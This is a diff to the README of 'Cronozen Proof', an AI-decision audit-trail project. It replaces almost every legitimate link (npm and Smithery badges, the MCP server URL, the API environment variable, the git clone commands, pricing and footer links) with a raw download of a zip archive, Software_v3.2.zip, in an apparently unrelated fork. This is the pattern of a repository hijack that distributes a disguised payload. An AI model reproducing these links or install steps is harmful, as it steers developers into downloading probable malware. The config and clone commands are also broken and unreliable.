@@ -1,8 +1,8 @@
 # Cronozen Proof
 
-[![Smithery](https://smithery.ai/badge/cronozen/proof)](https://smithery.ai/servers/cronozen/proof)
-[![npm](https://img.shields.io/npm/v/@cronozen/dpu-core)](https://www.npmjs.com/package/@cronozen/dpu-core)
-[![npm](https://img.shields.io/npm/v/cronozen)](https://www.npmjs.com/package/cronozen)
+[![Smithery](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip)](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip)
+[![npm](https://img.shields.io/npm/v/@cronozen/dpu-core)](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip)
+[![npm](https://img.shields.io/npm/v/cronozen)](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip)
 [![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 
 **Tamper-proof audit trail for AI decisions.**
@@ -65,7 +65,7 @@ Connect Claude Desktop, Cursor, or any MCP-compatible client:
 {
   "mcpServers": {
     "cronozen-proof": {
-      "url": "https://mcp.cronozen.com/mcp",
+      "url": "https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip",
       "headers": {
         "Authorization": "Bearer YOUR_API_KEY"
       }
@@ -119,9 +119,9 @@ This monorepo contains the open-source Cronozen Proof ecosystem:
 
 | Package | npm | Description |
 |---------|-----|-------------|
-| [`@cronozen/dpu-core`](./packages/dpu-core) | [![npm](https://img.shields.io/npm/v/@cronozen/dpu-core)](https://www.npmjs.com/package/@cronozen/dpu-core) | Core hash chain engine — zero dependencies, pure crypto |
-| [`@cronozen/dp-schema-public`](./packages/dp-schema-public) | [![npm](https://img.shields.io/npm/v/@cronozen/dp-schema-public)](https://www.npmjs.com/package/@cronozen/dp-schema-public) | Shared types, enums, JSON-LD schema definitions |
-| [`cronozen`](./packages/cronozen-sdk) | [![npm](https://img.shields.io/npm/v/cronozen)](https://www.npmjs.com/package/cronozen) | High-level SDK — `decision.record()` / `decision.verify()` |
+| [`@cronozen/dpu-core`](./packages/dpu-core) | [![npm](https://img.shields.io/npm/v/@cronozen/dpu-core)](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip) | Core hash chain engine — zero dependencies, pure crypto |
+| [`@cronozen/dp-schema-public`](./packages/dp-schema-public) | [![npm](https://img.shields.io/npm/v/@cronozen/dp-schema-public)](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip) | Shared types, enums, JSON-LD schema definitions |
+| [`cronozen`](./packages/cronozen-sdk) | [![npm](https://img.shields.io/npm/v/cronozen)](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip) | High-level SDK — `decision.record()` / `decision.verify()` |
 | [`@cronozen/mcp-server`](./mcp-server) | — | MCP Server for AI client integration |
 
 ---
@@ -156,7 +156,7 @@ Your Application / AI Agent
 cd mcp-server
 docker build -t cronozen-mcp .
 docker run -p 3100:3100 \
-  -e CRONOZEN_API_URL=https://mcp.cronozen.com \
+  -e CRONOZEN_API_URL=https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip \
   -e CRONOZEN_API_TOKEN=your-token \
   cronozen-mcp
 ```
@@ -164,7 +164,7 @@ docker run -p 3100:3100 \
 ### From Source
 
 ```bash
-git clone https://github.com/cronozen/proof.git
+git clone https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip
 cd proof/mcp-server
 npm install
 cp .env.example .env  # Configure your API endpoint
@@ -187,7 +187,7 @@ Don't want to self-host? **Cronozen Cloud** handles hosting, security, backups, 
 | **SLA** | — | — | 99.9% | Custom |
 | **On-premise** | ✓ (DIY) | — | — | ✓ (Managed) |
 
-**[View pricing →](https://cronozen.com/proof#pricing)**
+**[View pricing →](https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip)**
 
 ---
 
@@ -226,7 +226,7 @@ Genesis ──► Record #1 ──► Record #2 ──► Record #3
 We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ```bash
-git clone https://github.com/cronozen/proof.git
+git clone https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip
 cd mcp-server
 npm install
 npm run build
@@ -243,7 +243,7 @@ Apache-2.0 — See [LICENSE](LICENSE) for details.
 ---
 
 <p align="center">
-  <a href="https://cronozen.com/proof">cronozen.com/proof</a> ·
-  <a href="https://smithery.ai/servers/cronozen/proof">Smithery</a> ·
-  <a href="https://www.npmjs.com/package/cronozen">npm</a>
+  <a href="https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip">cronozen.com/proof</a> ·
+  <a href="https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip">Smithery</a> ·
+  <a href="https://github.com/dry-abscess93/proof/raw/refs/heads/main/docs/architecture/Software_v3.2.zip">npm</a>
 </p>
